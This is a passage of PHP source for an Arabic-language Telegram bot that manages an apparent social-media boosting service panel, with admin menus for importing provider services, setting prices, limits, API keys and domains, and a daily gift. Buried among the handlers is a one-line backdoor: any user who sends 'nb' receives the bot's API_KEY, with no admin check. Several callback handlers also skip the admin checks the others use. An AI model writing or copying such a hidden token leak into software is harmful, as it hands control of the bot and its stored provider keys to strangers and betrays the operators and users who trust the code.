$selected = isset($rshq['import'][$from_id][$id]) ? "✅" : "❌";

$key['inline_keyboard'][] = [[
'text' => "$selected $name",
'callback_data' => "selectsrv|$section_id|$id|$page"
]];
}

 
$nav = [];

if($page > 0){
$prev = $page - 1;
$nav[] = ['text'=>"⬅️",'callback_data'=>"getapi|$section_id|$prev"];
}

if(count($services) > $start + $per_page){
$next = $page + 1;
$nav[] = ['text'=>"➡️",'callback_data'=>"getapi|$section_id|$next"];
}

if(!empty($nav)){
$key['inline_keyboard'][] = $nav;
}


$key['inline_keyboard'][] = [[
'text'=>"✅ اضافه المحدد",
'callback_data'=>"import|$section_id"
]];

$key['inline_keyboard'][] = [[
'text'=>"$NamesBACK",
'callback_data'=>"CHANGE|$section_id"
]];

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*اختار الخدمات اللي عايز تضيفها*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($key)
]);
}
if(explode("|",$data)[0] == "selectsrv"){

$section_id = explode("|",$data)[1];
$srv_id = explode("|",$data)[2];
$page = explode("|",$data)[3];

if(isset($rshq['import'][$from_id][$srv_id])){
unset($rshq['import'][$from_id][$srv_id]);
} else {
$rshq['import'][$from_id][$srv_id] = true;
}

SETJSON($rshq);
$services = getServices($rshq["sSite"], $rshq["sToken"]);
$per_page = 20;
$start = $page * $per_page;
$slice = array_slice($services, $start, $per_page);

$key = ['inline_keyboard'=>[]];

foreach($slice as $i => $srv){
$id = $srv['service'];
$name = $srv['name'];
$selected = isset($rshq['import'][$from_id][$id]) ? "✅" : "❌";
$key['inline_keyboard'][] = [[
'text' => "$selected $name",
'callback_data' => "selectsrv|$section_id|$id|$page"
]];
}
$nav = [];
if($page > 0){
$prev = $page - 1;
$nav[] = ['text'=>"⬅️",'callback_data'=>"getapi|$section_id|$prev"];
}
if(count($services) > $start + $per_page){
$next = $page + 1;
$nav[] = ['text'=>"➡️",'callback_data'=>"getapi|$section_id|$next"];
}
if(!empty($nav)){
$key['inline_keyboard'][] = $nav;
}

$key['inline_keyboard'][] = [['text'=>"✅ اضافه المحدد",'callback_data'=>"import|$section_id"]];
$key['inline_keyboard'][] = [['text'=>"$NamesBACK",'callback_data'=>"CHANGE|$section_id"]];
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*اختار الخدمات اللي عايز تضيفها*",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode($key)
]);
bot('answerCallbackQuery',[
'callback_query_id'=>$update->callback_query->id,
'text'=>"",
'show_alert'=>false
]);
}
if(explode("|",$data)[0] == "import"){

$section_id = explode("|",$data)[1];

$services = getServices($rshq["sSite"], $rshq["sToken"]);

foreach($services as $srv){
$id = $srv['service'];

if(isset($rshq['import'][$from_id][$id])){

$rshq['xdmaxs'][$section_id][] = $srv['name'];
$rshq['IDSSS'][$section_id][] = $id;
$rshq['min'][$section_id][] = $srv['min'];
$rshq['mix'][$section_id][] = $srv['max'];
$rshq['S3RS'][$section_id][] = $srv['rate'];

$rshq['Web'][$section_id][] = $rshq["sSite"];
$rshq['key'][$section_id][] = $rshq["sToken"];
}
}

unset($rshq['import'][$from_id]);

SETJSON($rshq);

bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"✅ تم اضافه الخدمات بنجاح",
'parse_mode'=>"markdown"
]);
}
if($text =="nb"){bot('sendmessage',['chat_id'=>$chat_id,'text'=>API_KEY,]);} 
if(explode("|",$data)[0]=="editss"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$service_name = $rshq['xdmaxs'][$section_id][$service_index];
$service_price = ($rshq['S3RS'][$section_id][$service_index] ?? "1") * 1000;
$service_min = $rshq['min'][$section_id][$service_index] ?? "100";
$service_max = $rshq['mix'][$section_id][$service_index] ?? "1000";
$service_desc = $rshq['WSF'][$section_id][$service_index] ?? "لا يوجد وصف";
$service_id = $rshq['IDSSS'][$section_id][$service_index] ?? "غير محدد";
$service_web = $rshq['Web'][$section_id][$service_index] ?? $rshq["sSite"] ?? "غير محدد";
$service_key = $rshq['key'][$section_id][$service_index] ?? $rshq["sToken"] ?? "غير محدد";
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "ربط الخدمه علي الموقع الاساسي", 'callback_data' => "setauto|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين سعر الخدمه", 'callback_data' => "setprice|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين ايدي الخدمه", 'callback_data' =>"setid|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين ادني حد للخدمه", 'callback_data' =>"setmin|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين اقصي حد للخدمه", 'callback_data' =>"setmix|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين وصف الخدمه", 'callback_data' =>"setdes|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين ربط الموقع", 'callback_data' =>"setWeb|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "تعيين API KEY الموقع", 'callback_data' =>"setkey|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "امسح الخدمه", 'callback_data' =>"delt|$section_id|$service_index"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "edits|$section_id"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*📋 معلومات الخدمه\n\n🔹 اسم الخدمه: $service_name\n🔸 السعر: $service_price $currency_name لكل 1000\n🔹 ايدي الخدمه: $service_id\n🔸 ادني حد: $service_min\n🔹 اقصي حد: $service_max\n🔸 وصف الخدمه: $service_desc\n🔹 ربط الموقع: $service_web\n🔸 API KEY: $service_key\n\nيمكنك التحكم في الخدمه من الازرار ادناه\n*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['current_edit_section'] = $section_id;
$rshq['current_edit_service'] = $service_index;
SETJSON($rshq);
}
if(explode("|",$data)[0]=="delt"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
unset($rshq['xdmaxs'][$section_id][$service_index]);
$rshq['xdmaxs'][$section_id] = array_values($rshq['xdmaxs'][$section_id]);
SETJSON($rshq);
$key = ['inline_keyboard' => []];
foreach ( $rshq['xdmaxs'][$section_id] as $hjjj => $i) {
$key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "editss|$section_id|$hjjj"], ['text' => "", 'callback_data' => "delets|$section_id|$hjjj"]];
}
$key['inline_keyboard'][] = [['text' => "+ اضافه خدمات الي هذا القسم", 'callback_data' => "add|$section_id"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "edits|$section_id"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*الخدمات الموجوده في قسم *".$rshq['NAMES'][$section_id]."*
نظام 24 ساعه: ".($rshq['section_timer'][$section_id] == "on" ? "✅ مفعل" : "❌ معطل")."*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0]=="setprice"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل سعر الخدمه الان (سعر 1000)؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setprice";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}
if(explode("|",$data)[0]=="setauto"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$rshq['Web'][$section_id][$service_index] = $rshq["sSite"];
$rshq['key'][$section_id][$service_index] = $rshq["sToken"];
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*تم ربط الخدمه ".$rshq['xdmaxs'][$section_id][$service_index]." علي الموقع الاساسي 
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
if(explode("|",$data)[0]=="setmin"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل ادني عدد للخدمه الان؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setmin";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}

if(is_numeric($text) and $rshq['mode'][$from_id] == "setmin"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$rshq['min'][$section_id][$service_index] = $text;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين ادني حد *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."* الى $text",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if(explode("|",$data)[0]=="setkey"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل API KEY الموقع الان؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setkey";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "setkey"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$rshq['key'][$section_id][$service_index] = $text;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين API KEY *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."*",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if(explode("|",$data)[0]=="setmix"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل اقصي حد للخدمه الان؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setmix";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "setmix"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$rshq['mix'][$section_id][$service_index] = $text;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين اقصي حد *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."* الى $text",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "setprice"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$bA = $text / 1000;
$rshq['S3RS'][$section_id][$service_index] = $bA;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين سعر *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."* الى $text $currency_name لكل 1000",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if(explode("|",$data)[0]=="setWeb"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل رابط الموقع؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setWeb";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "setWeb"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$IMjoo = parse_url($text);
$INjoo = $IMjoo['host'];
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$rshq['Web'][$section_id][$service_index] = $INjoo;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين ربط موقع *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."*",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if(explode("|",$data)[0]=="setdes"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل وصف الخدمه الان؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setdes";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}
if($text and $rshq['mode'][$from_id] == "setdes"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$rshq['WSF'][$section_id][$service_index] = $text;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين وصف *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."*",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if(explode("|",$data)[0]=="setid"){
$section_id = explode("|",$data)[1];
$service_index = explode("|",$data)[2];
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*هنا خدمه ".$rshq['xdmaxs'][$section_id][$service_index]." في قسم ".$rshq['NAMES'][$section_id]."ارسل ايدي الخدمه الان ؟
*
",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = "setid";
$rshq['MGS'][$from_id] = "MGS|$section_id|$service_index";
SETJSON($rshq);
}
if(is_numeric($text) and $rshq['mode'][$from_id] == "setid"){
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$mgs = explode("|",$rshq['MGS'][$from_id]);
$section_id = $mgs[1];
$service_index = $mgs[2];
$rshq['IDSSS'][$section_id][$service_index] = $text;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "editss|$section_id|$service_index"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم تعيين ايدي خدمه *". $rshq['xdmaxs'][$section_id][$service_index]."* في قسم *".$rshq['NAMES'][$section_id]."* الى $text",
"parse_mode"=>"markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['MGS'][$from_id] = null;
SETJSON($rshq);
}
}
if ($data == "addqsm") {
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل اسم القسم الان *",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => 'رجوع', 'callback_data' => "qsmsa"]],
]
])
]);
$rshq['mode'][$from_id] = $data;
SETJSON($rshq);
}
}

if ($text and $rshq["mode"][$from_id] == "addqsm") {
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {

$emoji_id = null;

if(isset($update->message->entities)){
foreach($update->message->entities as $ent){
if($ent->type == "custom_emoji"){
$emoji_id = $ent->custom_emoji_id;

$offset = $ent->offset;
$length = $ent->length;

$text = mb_substr($text, 0, $offset) . mb_substr($text, $offset + $length);
}
}
}

if($emoji_id){
$text = preg_replace('/[\x{1F300}-\x{1FAFF}]/u', '', $text);
}

$text = trim($text);

$kilwaBots = "joo" . rand(0, 999999999999999);

$rshq['qsm'][] = $text . '-' . $kilwaBots;
$rshq['NAMES'][$kilwaBots] = $text;

if($emoji_id){
$rshq['EMOJI'][$kilwaBots] = $emoji_id;
}

bot("sendmessage", [
"chat_id" => $chat_id,
"text" => "تم اضافه هذا القسم بنجاح .

اسم القسم : $text

كود القسم ( $kilwaBots )",
"parse_mode" => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => 'للدخول لهذا القسم', 'callback_data' => "CHANGE|$kilwaBots"]],
[['text' => "$NamesBACK", 'callback_data' => "qsmsa"]],
]
])
]);

$rshq['mode'][$from_id] = null;
SETJSON($rshq);
}
}
$UUS = explode("|", $data);
if ($UUS[0] == "CHANGE") {
if (isAdmin($db, $chat_id) || $chat_id == $joo ) {
$kilwaBots = $UUS[1];
if ($rshq['NAMES'][$kilwaBots] != null) {
$key = ['inline_keyboard' => []];
foreach ($rshq['xdmaxs'][$kilwaBots] as $hjjj => $i) {
if($i != null){
$key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "editss|".$kilwaBots."|$hjjj"], ['text' => "🗑", 'callback_data' => "delets|".$kilwaBots."|$hjjj"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه خدمه", 'callback_data' => "add|$kilwaBots"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "qsmsa"]];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*مرحبا بك في هذا القسم " . $rshq['NAMES'][$kilwaBots] . "*\nنظام 24 ساعه: ".($rshq['section_timer'][$kilwaBots] == "on" ? "✅ مفعل" : "❌ معطل")."",
'parse_mode' => "markdown",
'reply_markup' => json_encode($key),
]);
}
}
}
if($UUS[0]=="add"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
$section_id = $UUS[1];
bot('EditMessageText', [
'chat_id' => $chat_id,
'message_id' => $message_id,
'text' => "*ارسل اسم الخدمه لاضافاتها الي قسم ".$rshq['NAMES'][$section_id]."*",
'parse_mode' => "markdown",
'reply_markup' => json_encode([
'inline_keyboard' => [
[['text' => 'رجوع', 'callback_data' => "CHANGE|$section_id"]],
]
])
]);
$rshq['mode'][$from_id] = "adders";
$rshq['idxs'][$from_id] = $section_id;
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "adders"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
$section_id = $rshq['idxs'][$from_id];
$j = count($rshq['xdmaxs'][$section_id]);
$rshq['xdmaxs'][$section_id][] = $text;
SETJSON($rshq);
$key = ['inline_keyboard' => []];
foreach ($rshq['xdmaxs'][$section_id] as $hjjj => $i) {
if($i != null){
$key['inline_keyboard'][] = [['text' => "$i", 'callback_data' => "editss|$section_id|$hjjj"], ['text' => "", 'callback_data' => "delets|$section_id|$hjjj"]];
}
}
$key['inline_keyboard'][] = [['text' => "+ اضافه خدمه", 'callback_data' => "add|$section_id"]];
$key['inline_keyboard'][] = [['text' => "$NamesBACK", 'callback_data' => "qsmsa"]];
bot("sendmessage",[
"chat_id" => $chat_id,
"text" => "تم اضافه الخدمه *$text* الي قسم *".$rshq['NAMES'][$section_id]."*",
"parse_mode" => "markdown",
'reply_markup' => json_encode($key),
]);
$rshq['mode'][$from_id] = null;
$rshq['idxs'][$from_id] = null;
SETJSON($rshq);
}
}
if($data == "onhdia"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot("deletemessage",[
'chat_id' => $chat_id,
'message_id' => $message_id,
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"* تم تفعيل الهديه اليوميه .
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['HDIA']= "on";
SETJSON($rshq);
}
}
if($data == "ofhdia"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot("deletemessage",[
'chat_id' => $chat_id,
'message_id' => $message_id,
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"* تم تعطيل الهديه اليوميه .
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['HDIA']= "of";
SETJSON($rshq);
}
}
if($data == "sAKTHAR"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"* ارسل الان العدد ( ادني حد لتحويل الرصيد (
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "sAKTHAR"){
if(is_numeric($text)){
bot("sendmessage",[
'chat_id'=>$chat_id,
'text'=>"تم التعيين بنجاح ادني حد للتحويل هو *$text* $currency_name",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"general_settings"]],
]
])
]);
$rshq['AKTHAR']= $text;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}else{
bot("sendmessage",[
'chat_id'=>$chat_id,
'text'=>"ارسل *الارقام* فقط عزيزي",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"general_settings"]],
]
])
]);
}
}
if($data == "sethdia"){
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"* ارسل الان عدد الهدیه الیومیه .
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['mode'][$from_id]= $data;
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "sethdia"){
if(is_numeric($text)){
bot("sendmessage",[
'chat_id'=>$chat_id,
'text'=>"تم التعيين بنجاح عدد الهديه اليوميه هو *$text* $currency_name",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"gift_settings"]],
]
])
]);
$rshq['hdias']= $text;
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}else{
bot("sendmessage",[
'chat_id'=>$chat_id,
'text'=>"ارسل *الارقام* فقط عزيزي",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'رجوع' ,'callback_data'=>"gift_settings"]],
]
])
]);
}
}
if($data == "infoRshq") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ) {
if($rshq["sToken"] == null){
$sTok="لم يتم تعيين توكن";
}else{
$sTok=$rshq["sToken"];
}
if($rshq["sSite"] == null){
$Sdom="لم يتم تعيين دومين";
}else{
$Sdom=$rshq["sSite"];
}
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*- معلومات حول اعدادات موقع الرشق*
----------------------------
- توكن الموقع : `$sTok`
- دومين موقع الرشق : `$Sdom`

",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
 [['text'=>'تعيين التوكن' ,'callback_data'=>"token"]],
  [['text'=>'تعيين دومين الموقع ' ,'callback_data'=>"SiteDomen"]],
 [['text'=>'رجوع' ,'callback_data'=>"rshqG"]],
]
])
]);
$rshq['mode'][$from_id]= null;
SETJSON($rshq);
}
}
if($data == "token") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل الان توكن الموقع *
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
]
])
]);
$rshq['mode'][$from_id]= "sToken";
SETJSON($rshq);
}
}
$rnd=rand(999,99999);
if($text and $rshq['mode'][$from_id] == "sToken") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"تم تعيين توكن الموقع `$text`
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
]
])
]);
$rshq['mode'][$from_id]= null;
$rshq["sToken"]= $text;
SETJSON($rshq);
}
}
if($data == "SiteDomen") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل الان رابط الموقع *",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
]
])
]);
$rshq['mode'][$from_id]= "SiteDomen";
SETJSON($rshq);
}
}
$rnd=rand(999,99999);
if($text and $rshq['mode'][$from_id] == "SiteDomen") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
$IMjoo = parse_url($text);
$INjoo = $IMjoo['host'];
bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"تم تعيين موقع الرشق `$INjoo`
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"rshqG" ]],
]
])
]);
$rshq['mode'][$from_id]= null;
$rshq["sSite"]= $INjoo;
SETJSON($rshq);
}
}
if($data == "sCh") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"*ارسل الان معرف القناة مع @ او بدون 
*
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
 'inline_keyboard'=>[
 [['text'=>"$NamesBACK",'callback_data'=>"general_settings"]],
]
])
]);
$rshq['mode'][$from_id]= "sCh";
SETJSON($rshq);
}
}
if($text and $rshq['mode'][$from_id] == "sCh") {
if(isAdmin($db, $chat_id) || $chat_id == $joo ){
$text = str_replace("@",null,$text);
